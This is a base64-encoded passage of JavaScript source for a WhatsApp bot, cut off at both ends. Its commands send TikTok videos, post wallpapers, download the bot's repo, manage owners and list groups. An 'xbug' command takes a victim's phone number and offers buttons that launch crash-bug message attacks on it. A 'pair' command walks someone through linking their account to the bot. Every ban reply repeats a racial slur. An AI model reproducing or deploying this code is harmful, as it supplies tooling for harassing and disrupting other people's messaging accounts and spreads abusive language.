6ShJyk7CnZhciBnaGVheXViaSA9IEpTT04ucGFyc2UoZnMucmVhZEZpbGVTeW5jKCcuL3NyYy9tZWRpYS90aWt0b2t2aWRzL2doZWF5dWJpLmpzb24nKSkKdmFyIGhhc2lsID0gcGlja1JhbmRvbShnaGVheXViaSkKcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsgY2FwdGlvbjogbS5zdWNjZXNzLCB2aWRlbzogeyB1cmw6IGhhc2lsLnVybCB9fSwgeyBxdW90ZWQ6IG0gfSkKYnJlYWs7CmNhc2UgJ3Rpa3Rva2JvY2lsJzoKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CnZhciBib2NpbCA9IEpTT04ucGFyc2UoZnMucmVhZEZpbGVTeW5jKCcuL3NyYy9tZWRpYS90aWt0b2t2aWRzL2JvY2lsLmpzb24nKSkKdmFyIGhhc2lsID0gcGlja1JhbmRvbShib2NpbCkKcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsgY2FwdGlvbjogbS5zdWNjZXNzLCB2aWRlbzogeyB1cmw6IGhhc2lsLnVybCB9fSwgeyBxdW90ZWQ6IG0gfSkKYnJlYWs7CmNhc2UgJ3Rpa3Rva3NleHknOgppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKdmFyIHVraHR5ID0gSlNPTi5wYXJzZShmcy5yZWFkRmlsZVN5bmMoJy4vc3JjL21lZGlhL3Rpa3Rva3ZpZHMvdWtodHkuanNvbicpKQp2YXIgaGFzaWwgPSBwaWNrUmFuZG9tKHVraHR5KQpyaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyBjYXB0aW9uOiBtLnN1Y2Nlc3MsIHZpZGVvOiB7IHVybDogaGFzaWwudXJsIH19LCB7IHF1b3RlZDogbSB9KQpicmVhazsKY2FzZSAndGlrdG9rc2FudHV5JzoKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CnZhciBzYW50dXkgPSBKU09OLnBhcnNlKGZzLnJlYWRGaWxlU3luYygnLi9zcmMvbWVkaWEvdGlrdG9rdmlkcy9zYW50dXkuanNvbicpKQp2YXIgaGFzaWwgPSBwaWNrUmFuZG9tKHNhbnR1eSkKcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsgY2FwdGlvbjogbS5zdWNjZXNzLCB2aWRlbzogeyB1cmw6IGhhc2lsLnVybCB9fSwgeyBxdW90ZWQ6IG0gfSkKYnJlYWs7CmNhc2UgJ3Rpa3Rva2theWVzJzoKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CnZhciBrYXllcyA9IEpTT04ucGFyc2UoZnMucmVhZEZpbGVTeW5jKCcuL3NyYy9tZWRpYS90aWt0b2t2aWRzL2theWVzLmpzb24nKSkKdmFyIGhhc2lsID0gcGlja1JhbmRvbShrYXllcykKcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsgY2FwdGlvbjogbS5zdWNjZXNzLCB2aWRlbzogeyB1cmw6IGhhc2lsLnVybCB9fSwgeyBxdW90ZWQ6IG0gfSkKYnJlYWs7CmNhc2UgJ3Rpa3Rva3BhbnJpa2EnOgppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKdmFyIHJpa2FndXNyaWFuaSA9IEpTT04ucGFyc2UoZnMucmVhZEZpbGVTeW5jKCcuL3NyYy9tZWRpYS90aWt0b2t2aWRzL3BhbnJpa2EuanNvbicpKQp2YXIgaGFzaWwgPSBwaWNrUmFuZG9tKHJpa2FndXNyaWFuaSkKcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsgY2FwdGlvbjogbS5zdWNjZXNzLCB2aWRlbzogeyB1cmw6IGhhc2lsLnVybCB9fSwgeyBxdW90ZWQ6IG0gfSkKYnJlYWs7CmNhc2UgJ3Rpa3Rva25vdCc6CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwp2YXIgbm90bm90ID0gSlNPTi5wYXJzZShmcy5yZWFkRmlsZVN5bmMoJy4vc3JjL21lZGlhL3Rpa3Rva3ZpZHMvbm90bm90Lmpzb24nKSkKdmFyIGhhc2lsID0gcGlja1JhbmRvbShub3Rub3QpCnJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7IGNhcHRpb246IG0uc3VjY2VzcywgdmlkZW86IHsgdXJsOiBoYXNpbC51cmwgfX0sIHsgcXVvdGVkOiBtIH0pCmJyZWFrOwpjYXNlICdhbmltZXdscCc6ewppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKIHdhaWZ1ZGQgPSBhd2FpdCBheGlvcy5nZXQoYGh0dHBzOi8vbmVrb3MubGlmZS9hcGkvdjIvaW1nL3dhbGxwYXBlcmApICAgICAgIAogICAgICAgICAgICBhd2FpdCByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyBpbWFnZTogeyB1cmw6d2FpZnVkZC5kYXRhLnVybH0gLCBjYXB0aW9uOiBtLnN1Y2Nlc3N9LCB7IHF1b3RlZDptIH0pLmNhdGNoKGVyciA9PiB7CnJldHVybignRXJyb3IhJykKfSkKfQpicmVhazsKY2FzZSAnc2MnOgpjYXNlICdzY3JpcHQnOgpjYXNlICdzdXBwb3J0JzoKY2FzZSAncmVwbyc6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiAgICBjb25zdCBheGlvcyA9IHJlcXVpcmUoJ2F4aW9zJyk7CiAgICBjb25zdCBmcyA9IHJlcXVpcmUoJ2ZzJyk7CiAgICBjb25zdCBwYXRoID0gcmVxdWlyZSgncGF0aCcpOwoKICAgIGNvbnN0IHppcFVybCA9ICdodHRwczovL2dpdGh1Yi5jb20vUmljaGlldGhnb2F0L0FLQU5FLU1EL2FyY2hpdmUvcmVmcy9oZWFkcy9tYXN0ZXIuemlwJzsKICAgIGNvbnN0IGZpbGVQYXRoID0gcGF0aC5qb2luKF9fZGlybmFtZSwgJ0FLQU5FLU1ELnppcCcpOwoKICAgIC8vIERvd25sb2FkIHRoZSBaSVAgZmlsZQogICAgYXhpb3MoewogICAgICAgIG1ldGhvZDogJ0dFVCcsCiAgICAgICAgdXJsOiB6aXBVcmwsCiAgICAgICAgcmVzcG9uc2VUeXBlOiAnc3RyZWFtJywKICAgIH0pLnRoZW4ocmVzcG9uc2UgPT4gewogICAgICAgIGNvbnN0IHdyaXRlciA9IGZzLmNyZWF0ZVdyaXRlU3RyZWFtKGZpbGVQYXRoKTsKICAgICAgICByZXNwb25zZS5kYXRhLnBpcGUod3JpdGVyKTsKCiAgICAgICAgd3JpdGVyLm9uKCdmaW5pc2gnLCAoKSA9PiB7CiAgICAgICAgICAgIC8vIFNlbmQgdGhlIFpJUCBmaWxlCiAgICAgICAgICAgIHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7CiAgICAgICAgICAgICAgICBkb2N1bWVudDogZnMucmVhZEZpbGVTeW5jKGZpbGVQYXRoKSwKICAgICAgICAgICAgICAgIG1pbWV0eXBlOiAnYXBwbGljYXRpb24vemlwJywKICAgICAgICAgICAgICAgIGZpbGVOYW1lOiAnQUtBTkUtTUQuemlwJywKICAgICAgICAgICAgICAgIGNhcHRpb246ICdgYGBIZXJlIGlzIHRoZSBsYXRlc3QgQUtBTkUtTUQgWklQIGZpbGVgYGDwn5iHJwogICAgICAgICAgICB9LCB7IHF1b3RlZDogbSB9KTsKCiAgICAgICAgICAgIC8vIFByZXBhcmUgYW5kIHNlbmQgdGhlIGZvbGxvdy11cCBtZXNzYWdlCiAgICAgICAgICAgIGNvbnN0IGZvbGxvd1VwTWVzc2FnZSA9IGAqSGkgQCR7c2VuZGVyLnNwbGl0KCJAIilbMF19IPCfgIQqCgrwnZi88J2ZhvCdmLzwnZmJ8J2ZgCDwnZmI8J2YvyDwnZmN8J2ZgPCdmYfwnZmA8J2YvPCdmY7wnZmA8J2YvyDwnZmK8J2ZiSDwnZmC8J2ZhPCdmY/wnZmD8J2ZkPCdmL0KCvCfgIQgKlJFUE8gTElOSzoqIFtHaXRIdWJdKGh0dHBzOi8vZ2l0aHViLmNvbS9SaWNoaWV0aGdvYXQvQUtBTkUtTUQuZ2l0KQrwn4CEICpDSEFOTkVMIExJTks6KiBbaHR0cHM6Ly93aGF0c2FwcC5jb20vY2hhbm5lbC8wMDI5VmJBZHFvd0swSUJkMHVxaHlsMzhdCvCfgIQgKlN1cHBvcnQqIDogRG9uJ3QgZm9yZ2V0IHRvIOKtkCBTdGFyICYgRm9yayB0aGUgcmVwbywgYW5kIGZvbGxvdyBteSBjaGFubmVsIQrwn4CEXGBcYFxgdGhhbmtzIHRvIFBhdHJvbiBNRCDwn5q5IGZvciB0aGUgc3VwcG9ydCBhbHNvXGBcYFxgCgo+ICrwnZiM8J2YlfCdmJHwnZiW8J2YoPCfmIoqYDsKCiAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgICAgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsKICAgICAgICAgICAgICAgICAgICB0ZXh0OiBmb2xsb3dVcE1lc3NhZ2UsCiAgICAgICAgICAgICAgICAgICAgY29udGV4dEluZm86IHsKICAgICAgICAgICAgICAgICAgICAgICAgZXh0ZXJuYWxBZFJlcGx5OiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaG93QWRBdHRyaWJ1dGlvbjogdHJ1ZSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRpdGxlOiBvd25lcm5hbWUsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBib2R5OiAnUklDSElFJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRodW1ibmFpbFVybDogJ2h0dHBzOi8vZmlsZXMuY2F0Ym94Lm1vZS9seXlkcmIuanBnJywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNvdXJjZVVybDogd2FnYywKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1lZGlhVHlwZTogMSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlbmRlckxhcmdlclRodW1ibmFpbDogdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSwgeyBxdW90ZWQ6IG0gfSk7CiAgICAgICAgICAgIH0sIDMwMDApOyAvLyBEZWxheSAzIHNlY29uZHMgYmVmb3JlIHNlbmRpbmcgdGhlIHNlY29uZCBtZXNzYWdlCiAgICAgICAgfSk7CgogICAgICAgIHdyaXRlci5vbignZXJyb3InLCBlcnIgPT4gewogICAgICAgICAgICBjb25zb2xlLmVycm9yKCdEb3dubG9hZCBlcnJvcjonLCBlcnIpOwogICAgICAgICAgICByaWNoLnNlbmRNZXNzYWdlKG0uY2hhdCwgeyB0ZXh0OiAnKkVycm9yIGRvd25sb2FkaW5nIFpJUCBmaWxlISog8J+AhCcgfSwgeyBxdW90ZWQ6IG0gfSk7CiAgICAgICAgfSk7CiAgICB9KS5jYXRjaChlcnJvciA9PiB7CiAgICAgICAgY29uc29sZS5lcnJvcignUmVxdWVzdCBlcnJvcjonLCBlcnJvcik7CiAgICAgICAgcmljaC5zZW5kTWVzc2FnZShtLmNoYXQsIHsgdGV4dDogJypGYWlsZWQgdG8gZmV0Y2ggWklQIGZpbGUhKiDwn4CEJyB9LCB7IHF1b3RlZDogbSB9KTsKICAgIH0pOwp9CmJyZWFrOwoKY2FzZSAicGxheTIiOnsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiAgICByZXBseWdjKG1lc3Mud2FpdCkKICAgICAgICAgICAgICAgIGlmICghdGV4dCkgcmV0dXJuIHJlcGx5KGBcbipleDoqICR7cHJlZml4ICsgY29tbWFuZH0gZnVja2xvdmVcbmApCiAgICAgICAgICAgICAgICBhd2FpdCByZWFjdGlvbihtLmNoYXQsICfwn4CEJykKICAgICAgICAgICAgICAgIGxldCBtYnV0ID0gYXdhaXQgZmV0Y2hKc29uKGBodHRwczovL29jaGlucG8taGVscGVyLmhmLnNwYWNlL3l0P3F1ZXJ5PSR7dGV4dH1gKQogICAgICAgICAgICAgICAgbGV0IGFoaCA9IG1idXQucmVzdWx0CiAgICAgICAgICAgICAgICBsZXQgY3JvdCA9IGFoaC5kb3dubG9hZC5hdWRpbwoKICAgICAgICAgICAgICAgIHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7CiAgICAgICAgICAgICAgICAgICAgYXVkaW86IHsgdXJsOiBjcm90IH0sCiAgICAgICAgICAgICAgICAgICAgbWltZXR5cGU6ICJhdWRpby9tcGVnIiwgCiAgICAgICAgICAgICAgICAgICAgcHR0OiB0cnVlCiAgICAgICAgICAgICAgICB9LCB7IHF1b3RlZDogbSB9KQogICAgICAgICAgICB9CiAgICAgICAgICAgIGJyZWFrOwpjYXNlICdhdXRvYmlvJzoKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiAgICAgICBpZiAoIWlzQ3JlYXRvcikgcmV0dXJuIG0ucmVwbHkoImBgYGZvciBPd25lciBvbmx5YGBgLiIpOwogICAgICAgICAgICAgICAgaWYgKGFyZ3MubGVuZ3RoIDwgMSkgcmV0dXJuIHJlcGx5ZyhgRXhhbXBsZSAke3ByZWZpeCArIGNvbW1hbmR9IG9uL29mZmApCiAgICAgICAgICAgICAgICBpZiAocSA9PSAnb24nKSB7CiAgICAgICAgICAgICAgICAgICAgYXV0b2JpbyA9IHRydWUKICAgICAgICAgICAgICAgICAgICByZXBseShgU3VjY2Vzc2Z1bGx5IENoYW5nZWQgQXV0b0JpbyBUbyAke3F9YCkKICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAocSA9PSAnb2ZmJykgewogICAgICAgICAgICAgICAgICAgIGF1dG9iaW8gPSBmYWxzZQogICAgICAgICAgICAgICAgICAgIHJlcGx5KGBTdWNjZXNzZnVsbHkgQ2hhbmdlZCBBdXRvQmlvIFRvICR7cX1gKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlICdkZWxwYWlyJzoKICBpZiAoIXEpIHJldHVybiByZXBseShgRXhhbXBsZTogJHtwcmVmaXggKyBjb21tYW5kfSAyMzR4eHhgKTsKICBjb25zdCBkaXJQYXRoID0gJy4vbGliMi9wYWlyaW5nLyc7CiAgY29uc3QgZm9sZGVyTmFtZSA9IGZzLnJlYWRkaXJTeW5jKGRpclBhdGgpLmZpbmQoKGZpbGUpID0+IHsKICAgIHJldHVybiBmaWxlLmVuZHNXaXRoKGAke3F9QHMud2hhdHNhcHAubmV0YCk7CiAgfSk7CiAgaWYgKCFmb2xkZXJOYW1lKSByZXR1cm4gcmVwbHkoYEZvbGRlciBub3QgZm91bmQ6ICR7cX1gKTsKICB0cnkgewogICAgZnMucm1kaXJTeW5jKHBhdGguam9pbihkaXJQYXRoLCBmb2xkZXJOYW1lKSwgeyByZWN1cnNpdmU6IHRydWUgfSk7CiAgICByZXBseShgcGFpciBudW1iZXIgZGVsZXRlZCBTdWNjZXNzZnVsbHk6ICR7Zm9sZGVyTmFtZX1gKTsKICB9IGNhdGNoIChlcnIpIHsKICAgIHJlcGx5KGBFcnJvciBkZWxldGluZyBwYWlyZWQgZGV2aWNlICR7ZXJyLm1lc3NhZ2V9YCk7CiAgfQpicmVhazsKY2FzZSAnbGlzdHBhaXInOgppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICAgIGlmICghaXNDcmVhdG9yKSByZXR1cm4gbS5yZXBseSgiYGBgZm9yIE93bmVyIG9ubHlgYGAuIik7CiAgdHJ5IHsKICAgIGNvbnN0IGRpclBhdGggPSAnLi9saWIyL3BhaXJpbmcvJzsKICAgIGNvbnN0IGZvbGRlck5hbWVzID0gZnMucmVhZGRpclN5bmMoZGlyUGF0aCkuZmlsdGVyKChmaWxlKSA9PiB7CiAgICAgIHJldHVybiBmcy5zdGF0U3luYyhwYXRoLmpvaW4oZGlyUGF0aCwgZmlsZSkpLmlzRGlyZWN0b3J5KCk7CiAgICB9KTsKICAgIHJlcGx5KGBMaXN0IG9mIHBhaXJlZCBkZXZpY2U6ICR7Zm9sZGVyTmFtZXMuam9pbignLCAnKX1gKTsKICB9IGNhdGNoIChlcnIpIHsKICAgIHJlcGx5KGBFcnJvciBsaXN0aW5nOiAke2Vyci5tZXNzYWdlfWApOwogIH0KYnJlYWs7CmNhc2UgJ3BhaXInOgppZiAoaXNiYW4pIHJldHVybiByZXBseSgnIFlPVVIgQkFOTkVEIEZST00gQUNDRVNTSU5HIFRISVMgQk9UIE5JR0dBIPCfpKEnKTsKICAgIGlmICghaXNDcmVhdG9yKSByZXR1cm4gbS5yZXBseSgiYGBgZm9yIE93bmVyIG9ubHlgYGAuIik7CiAgaWYgKCFxKSByZXR1cm4gcmVwbHkoYEV4YW1wbGU6XG4gJHtwcmVmaXggKyBjb21tYW5kfSAyMzR4eHhgKQogIHRhcmdldCA9IHRleHQuc3BsaXQoInwiKVswXQogIHNqaWQgPSBtLm1lbnRpb25lZEppZFswXSA/IG0ubWVudGlvbmVkSmlkWzBdIDogbS5xdW90ZWQgPyBtLnF1b3RlZC5zZW5kZXIgOiB0YXJnZXQucmVwbGFjZSgvW14wLTldL2csJycpKyJAcy53aGF0c2FwcC5uZXQiCiAgdmFyIGNvbnRhY3RJbmZvID0gYXdhaXQgcmljaC5vbldoYXRzQXBwKHNqaWQpOwogIGlmIChjb250YWN0SW5mby5sZW5ndGggPT0gMCkgewogICAgcmV0dXJuIHJlcGx5KCJUaGUgbnVtYmVyIGlzIG5vdCByZWdpc3RlcmVkIG9uIFdoYXRzQXBwIik7CiAgfQogIGNvbnN0IHN0YXJ0cGFpcmluZyA9IHJlcXVpcmUoJy4vZ2lmdGJvdC5qcycpOwogIGF3YWl0IHN0YXJ0cGFpcmluZyhzamlkKTsKICBhd2FpdCBzbGVlcCg0MDAwKQogIGNvbnN0IGN1ID0gZnMucmVhZEZpbGVTeW5jKCcuL2xpYjIvcGFpcmluZy9wYWlyaW5nLmpzb24nLCAndXRmLTgnKTsKICBjb25zdCBjdU9iaiA9IEpTT04ucGFyc2UoY3UpOwogIGF3YWl0IHJpY2gucmVsYXlNZXNzYWdlKGZyb20sIHsKICAgIHZpZXdPbmNlTWVzc2FnZTogewogICAgICBtZXNzYWdlOiB7CiAgICAgICAgaW50ZXJhY3RpdmVNZXNzYWdlOiB7CiAgICAgICAgICBib2R5OiB7CiAgICAgICAgICAgIHRleHQ6IGBDb2RlOiAke2N1T2JqLmNvZGV9XG4qVXNlIHRoaXMgQ29kZSB0byBiZWNvbWUgYSBib3QuKlxuXG4KICAgICAgICAgICAgMS4gT24geW91ciBXaGF0c0FwcCBob21lIHBhZ2UsIGNsaWNrIG9uIHRoZSB0aHJlZSBkb3RzIGluIHRoZSB0b3AgcmlnaHQgY29ybmVyLgogICAgICAgICAgICAyLiBUYXAgKkxpbmsgRGV2aWNlKgogICAgICAgICAgICAzLiBUYXAgKkxpbmsgYSBkZXZpY2UqCiAgICAgICAgICAgIDQuIEp1c3QgYmVsb3cgdGhlcmUgd2lsbCBiZSBhICpMaW5rIHdpdGggcGhvbmUgbnVtYmVyIGluc3RlYWQqLCB0YXAgb24gaXQKICAgICAgICAgICAgNS4gUGFzdGUgeW91ciA2IGNoYXJhY3RlciBjb2RlLmAKICAgICAgICAgIH0sCiAgICAgICAgICBoZWFkZXI6IHt9LAogICAgICAgICAgbmF0aXZlRmxvd01lc3NhZ2U6IHsKICAgICAgICAgICAgYnV0dG9uczogW3sKICAgICAgICAgICAgICBuYW1lOiAiY3RhX2NvcHkiLAogICAgICAgICAgICAgIGJ1dHRvblBhcmFtc0pzb246IEpTT04uc3RyaW5naWZ5KHsKICAgICAgICAgICAgICAgIGRpc3BsYXlfdGV4dDogIkNPUFkiLAogICAgICAgICAgICAgICAgdXJsOiBgaHR0cHM6Ly93d3cud2hhdHNhcHAuY29tL290cC9jb2RlLz9vdHBfdHlwZT1DT1BZX0NPREUmY29kZT1vdHAke2N1T2JqLmNvZGV9YCwKICAgICAgICAgICAgICAgIGNvcHlfY29kZTogY3VPYmouY29kZSwKICAgICAgICAgICAgICB9KQogICAgICAgICAgICB9XQogICAgICAgICAgfQogICAgICAgIH0KICAgICAgfQogICAgfQogIH0sIHt9KTsKYnJlYWs7ICAgICAgICAKY2FzZSAneGJ1Zyc6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiAgICBpZiAoIWlzQ3JlYXRvcikgcmV0dXJuIG0ucmVwbHkoImBgYGZvciBPd25lciBvbmx5YGBgLiIpOwogICAgaWYgKCF0ZXh0KSByZXR1cm4gcmVwbHkoImV4cGFtbGU6IC54YnVnIDIzNHh4eCIpOwogICAgbGV0IHRhcmdldElkID0gdGV4dC5yZXBsYWNlKC9bXjAtOV0vZywgJycpICsgIkBzLndoYXRzYXBwLm5ldCI7CiAgICBsZXQgTGlua0Jva2VwID0gJ2h0dHBzOi8vZmlsZXMuY2F0Ym94Lm1vZS8yc2xrbGkuanBnJzsgLy8gR2FudGkgZGVuZ2FuIFVSTCBnYW1iYXIgeWFuZyB2YWxpZAoKICAgIHJpY2guc2VuZE1lc3NhZ2UobS5jaGF0LCB7CiAgICAgICAgaW1hZ2U6IHsgdXJsOiBMaW5rQm9rZXAgfSwKICAgICAgICBjYXB0aW9uOiBgKvCdkajwnZKM8J2SgvCdko/wnZKGIPCdkoPwnZKW8J2SlfCdkpXwnZKQ8J2SjyDwnZKE8J2Sk/CdkoLwnZKU8J2SiTogJHt0YXJnZXRJZH1gLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGV4dEluZm86IHsKICAgICAgZm9yd2FyZGluZ1Njb3JlOiA5OTk5OSwKICAgICAgICAgICAgaXNGb3J3YXJkZWQ6IHRydWUsCiAgICAgICAgICAgIGZvcndhcmRlZE5ld3NsZXR0ZXJNZXNzYWdlSW5mbzogewogICAgICAgICAgICAgICAgbmV3c2xldHRlckppZDogIjEyMDM2MzM2MjYxMDAyNjA1MkBuZXdzbGV0dGVyIiwKICAgICAgICAgICAgICAgIHNlcnZlck1lc3NhZ2VJZDogbnVsbCwKICAgICAgICAgICAgICAgICAgbmV3c2xldHRlck5hbWU6IGDwnZGo8J2SjPCdkoLwnZKP8J2ShiDwnZKE8J2Sk/CdkoLwnZKU8J2SiWAKICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAgICAgbWVudGlvbmVkSmlkOiBbJzIzNDkxNjYxMDM2ODNAcy53aGF0c2FwcC5uZXQnXSwKICAgICAgICAgICAgICAgICAgICB9LAogICAgICAgIGZvb3RlcjogIlJJQ0hJRSIsCiAgICAgICAgYnV0dG9uczogWwogICAgICAgICAgICB7IGJ1dHRvbklkOiBgLmNvbWJvICR7dGFyZ2V0SWR9YCwgYnV0dG9uVGV4dDogeyBkaXNwbGF5VGV4dDogIuKDn+KPpM2fzZ/NnvCdmL7wnZmK8J2ZiPCdmL3wnZmE8J2ZifCdmYDij6TNn82ezZ7MrcyqIiB9LCB0eXBlOiAxIH0sCiAgICAgICAgICAgIHsgYnV0dG9uSWQ6IGAuaW9zeCAke3RhcmdldElkfWAsIGJ1dHRvblRleHQ6IHsgZGlzcGxheVRleHQ6ICLij6TNn82ezZ7wnZmE8J2ZivCdmY7Nn82fzZ4iIH0sIHR5cGU6IDEgfSwKICAgICAgICAgICAgeyBidXR0b25JZDogYC5pbnZpZCAke3RhcmdldElkfWAsIGJ1dHRvblRleHQ6IHsgZGlzcGxheVRleHQ6ICLij6TNn82fzZ7wnZi88J2ZifCdmL/wnZmN8J2Zis2fzZ/Nns2ezZ/vuY/Mh8ywIiB9LCB0eXBlOiAxIH0KICAgICAgICBdLAogICAgICAgIGhlYWRlclR5cGU6IDIsCiAgICAgICAgdmlld09uY2U6IHRydWUKICAgIH0sIHsgcXVvdGVkOiBtIH0pOwp9CmJyZWFrOwogICBjYXNlICJhYnVnIjoKICAgICAgICB7CiAgICAgICAgICByZXBseSgiSEVSRSBBUkUgVEhFIExJU1QgT0YgTk9STUFMIENPTU1NQUQgQVZBSUxBQkxFIPCfgIRcbuKXhiDwnZKK8J2Sj/CdkpfwnZKK8J2ShSBcbuKWsvCdkorwnZKQ8J2SlPCdkpkgXG7ilqDwnZKE8J2SkPCdko7wnZKD8J2SkCAiKTsKICAgICAgICB9CiAgICAgICAgYnJlYWs7ICAKY2FzZSAibGlzdGdjIjp7CmlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwpsZXQgZ2V0R3JvdXBzID0gYXdhaXQgcmljaC5ncm91cEZldGNoQWxsUGFydGljaXBhdGluZygpCmxldCBncm91cHMgPSBPYmplY3QuZW50cmllcyhnZXRHcm91cHMpLnNsaWNlKDApLm1hcCgoZW50cnkpID0+IGVudHJ5WzFdKQpsZXQgYW51ID0gZ3JvdXBzLm1hcCgodikgPT4gdi5pZCkKbGV0IGhpdHVldCA9IDAKbGV0IHRla3MgPSBg4qyjICpMSVNUIE9GIEdST1VQIEJFTE9XKlxuXG5Ub3RhbCBHcm91cCA6ICR7YW51Lmxlbmd0aH0gR3JvdXBcblxuYApmb3IgKGxldCB4IG9mIGFudSkgewpsZXQgbWV0YWRhdGEyID0gYXdhaXQgcmljaC5ncm91cE1ldGFkYXRhKHgpCnRla3MgKz0gYOKdjyBHcm91cCAke2hpdHVldCs9MX1cbuKUguKtlCAqTmFtZSA6KiAke21ldGFkYXRhMi5zdWJqZWN0fVxu4pSC4q2UICpJRCA6KiAke21ldGFkYXRhMi5pZH1cbuKUguKtlCAqTUVNQkVSIDoqICR7bWV0YWRhdGEyLnBhcnRpY2lwYW50cy5sZW5ndGh9XG7ilbDilIDilIDilIDilIB8XG5cbmAKfQptLnJlcGx5KHRla3MpCn0KYnJlYWs7CiBjYXNlICdhZGRvd25lcic6IGNhc2UgJ2FkZG93bic6IHsKIGlmIChpc2JhbikgcmV0dXJuIHJlcGx5KCcgWU9VUiBCQU5ORUQgRlJPTSBBQ0NFU1NJTkcgVEhJUyBCT1QgTklHR0Eg8J+koScpOwogICAgaWYgKCFpc0NyZWF0b3IpIHJldHVybiBtLnJlcGx5KCJgYGBmb3IgT3duZXIgb25seWBgYC4iKTsKICAgIGlmICghYXJnc1swXSkgcmV0dXJuIG0ucmVwbHkoYFVzYWdlOiAke2NvbW1hbmR9IDIzNHh4eGApOwoKICAgIGxldCBudW1iZXIgPSBxdGV4dC5yZXBsYWNlKC9bXjAtOV0vZywgJycpOwogICAgbGV0IGNoZWNrTnVtYmVyID0gYXdhaXQgcmljaC5vbldoYXRzQXBwKG51bWJlciArICJAcy53aGF0c2FwcC5uZXQiKTsKICAgIGlmICghY2hlY2tOdW1iZXIubGVuZ3RoKSByZXR1cm4gbS5yZXBseSgiSW52YWxpZCBudW1iZXIhIik7CgogICAgb3duZXIucHVzaChudW1iZXIpOwogICAgUHJlbWl1bS5wdXNoKG51bWJlcik7CiAgICBmcy53cml0ZUZpbGVTeW5jKCcuL2Z1bmN0aW9uL293bmVyLmpzb24nLCBKU09OLnN0cmluZ2lmeShvd25lcikpOwogICAgZnMud3JpdGVGaWxlU3luYygnLi9mdW5jdGlvbi9wcmVtaXVtLmpzb24nLCBKU09OLnN0cmluZ2lmeShQcmVtaXVtKSk7CgogICAgbS5yZXBseSgiT3duZXIgYWRkZWQgc3VjY2Vzc2Z1bGx5LiIpOwp9CmJyZWFrOwpjYXNlICdkZWxvd25lcic6IGNhc2UgJ2RlbG93bic6IHsKaWYgKGlzYmFuKSByZXR1cm4gcmVwbHkoJyBZT1VSIEJBTk5FRCBGUk9NIEFDQ0VTU0lORyBUSElTIEJPVCBOSUdHQSDwn6ShJyk7CiAgICBpZiAoIWlzQ3JlYXRvcikgcmV0dXJuIG0ucmVwbHkoIk93bmVyIG9ubHkuIik7CiAgICBpZiAoIWFyZ3NbMF0pIHJldHVybiBtLnJlcGx5KGBVc2FnZTogJHtjb21tYW5kfSAyMzR4eHhgKTsKCiAgICBsZXQgbnVtYmVyID0gcXRleHQucmVwbGFjZSgvW14wLTldL2csICcnKTsKICAgIG93b